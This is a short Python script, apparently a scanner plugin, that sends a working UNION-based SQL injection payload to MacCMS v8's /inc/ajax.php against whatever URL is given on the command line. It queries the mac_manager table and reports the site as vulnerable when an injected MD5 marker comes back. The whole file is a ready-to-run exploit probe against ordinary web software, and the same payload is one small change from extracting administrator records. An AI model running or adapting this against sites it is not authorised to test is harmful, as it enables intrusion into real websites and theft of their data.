#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/inc/ajax.php?ac=digg&ac2=&id=1&tab=vod+union+select/**/+null,md5(1231412414)+from+mac_manager+--%20"
bug ="efc2303c9fe1ac39f7bc336d2c1a1252"
info ="/inc/ajax.php?ac=digg&ac2=&id=1&tab=vod+ 存在MacCMS v8 /inc_ajax.php SQL注入漏洞"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
